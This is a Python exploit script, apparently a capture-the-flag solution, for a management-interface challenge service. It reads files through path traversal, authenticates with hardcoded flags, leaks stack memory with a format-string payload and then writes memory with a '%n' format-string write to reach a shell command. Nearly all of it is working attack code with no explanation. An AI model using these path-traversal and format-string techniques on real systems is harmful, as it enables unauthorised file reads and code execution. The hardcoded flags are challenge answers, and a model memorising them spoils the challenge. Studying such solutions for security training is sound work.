#!/usr/bin/python3
import socket
import sys


if True:
    sock = socket.socket()
    sock.connect(('mngmnt-iface.ctfcompetition.com', 1337))

    fp = sock.makefile('rwb')

else:
    fp = sys.stdin


def read_until(text):
    buf = b''
    while True:
        line = fp.readline()
        buf += line
        if text in line:
            return buf


def send(s):
    fp.write(s if isinstance(s, bytes) else s.encode('latin'))
    fp.write(b'\n')
    fp.flush()


def read_file(path):
    read_until(b'3) Quit')
    send('2')
    read_until(b'Which patchnotes should be shown?')
    send('../../../{}'.format(path))

    content = read_until(b'=== Management Interface ===')
    return content.rstrip(b'=== Management Interface ===\n')


def dump_file(path):
    print('>>> {}'.format(path))
    print(read_file(path).decode('utf8'))
    print()



send('1\nCTF{I_luv_buggy_sOFtware}\nCTF{Two_PasSworDz_Better_th4n_1_k?}')
read_until(b'Authenticated')


def leak_stack(prefix_size, n=500):
    payload = ('A' * prefix_size) + '!' + '%08x ' * n
    send('echo ' + payload)
    r = fp.readline()[2:].lstrip(b'A')[1:].rstrip()
    return bytes.fromhex(r.decode('utf8')), r

n = 2
prefix_size = n * 4
stack, raw_stack = leak_stack(prefix_size, 500)
pos = stack.find(b'AAAA')
print('>>', n, prefix_size, pos)
assert pos != -1, 'Magic not found at: {}'.format(stack)

print(pos, prefix_size)
# print(raw_stack)

send('shell')
print(fp.readline())

addr = 0x41616138
prefix = (b'A' * (prefix_size - 5)) + addr.to_bytes(4, 'little')
payload = b'echo ' + prefix + ('%08x ' * ((pos // 4) + 0)).encode('latin') + b'%n'
send(payload)
print(fp.readline())


send('shell')
print(fp.readline())
